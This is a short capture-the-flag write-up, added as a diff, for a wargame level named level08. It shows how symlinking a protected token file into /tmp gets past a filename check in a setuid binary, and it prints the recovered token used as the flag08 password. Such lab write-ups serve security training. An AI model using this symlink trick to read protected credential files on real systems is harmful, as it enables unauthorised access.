@@ -1,0 +1,10 @@
+when you open the execution instructions you will see it read the token content and print it and it takes a file as a parameter but we could not directly read from file named token so in this case soft link will help 
+
+ln -s /home/user/level08/token /tmp/file
+
+.then
+
+./level08 /tmp/file => quif5eloekouj29ke0vouxean 
+
+-> su flag08 password = quif5eloekouj29ke0vouxean
+
